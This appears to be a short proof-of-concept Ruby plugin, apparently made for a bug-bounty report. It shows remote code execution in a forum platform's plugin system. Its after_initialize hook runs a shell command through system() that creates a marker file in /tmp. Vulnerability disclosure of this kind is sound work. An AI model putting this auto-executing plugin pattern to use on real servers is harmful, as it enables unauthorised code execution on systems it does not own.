# frozen_string_literal: true

# name: malicious_plugin
# about: A malicious plugin to test RCE
# version: 0.0.1
# authors: evil
# url: http://evil.local

after_initialize do
  puts "MALICIOUS PLUGIN EXECUTING... by w3shi(S.Lakshmi Vignesh(H1-POC)"
  system("touch /tmp/pwned_by_plugin") # Proof of RCE
end
